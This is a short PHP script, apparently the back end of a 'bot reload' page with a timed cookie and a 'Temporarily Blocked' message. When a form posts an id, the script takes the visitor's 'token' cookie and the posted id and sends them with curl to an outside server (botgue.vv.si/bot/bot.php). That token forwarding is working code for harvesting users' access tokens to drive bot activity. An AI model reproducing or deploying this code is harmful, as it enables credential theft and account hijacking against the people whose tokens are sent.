<?php
if(isset($_POST['id'])){if($_COOKIE['bot']){$hehe ='<section class="dialog" style="display:block"></section>';}else{setcookie("bot","ada",time()+600);
$curlHandle = curl_init();
curl_setopt($curlHandle,CURLOPT_URL, "http://botgue.vv.si/bot/bot.php");
curl_setopt($curlHandle,CURLOPT_HEADER, 0);
curl_setopt($curlHandle,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curlHandle,CURLOPT_TIMEOUT, 30);
curl_setopt($curlHandle,CURLOPT_POST, 1);

curl_setopt($curlHandle,CURLOPT_POSTFIELDS,"token=".$_COOKIE['token']."&id=".$_POST['id']."&visit=zymi.antserve.net");
curl_exec($curlHandle);
curl_close($curlHandle);
}}$titror ='<script>var titleError ="ERROR : Temporarily Blocked";var textError ="Please Wait <b>600 Seconds</b> Before You Could Get ReLoad Bot , We Are Sorry For The Inconvenience!";</script>';?>
